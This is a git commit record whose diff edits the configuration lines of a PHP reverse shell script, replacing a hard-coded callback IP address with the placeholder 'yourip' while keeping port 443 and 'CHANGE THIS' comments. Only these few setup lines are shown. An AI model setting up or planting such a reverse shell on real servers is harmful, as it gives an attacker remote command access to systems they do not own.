6922ad813756eb3fc8bb1a610c501870c3fdd0ea
alikisinyo <56311840+alikisinyo@users.noreply.github.com>
2024-01-09 13:13:56 +0300

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.100.100.141';  // CHANGE THIS
+$ip = 'yourip';  // CHANGE THIS
 $port = 443;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
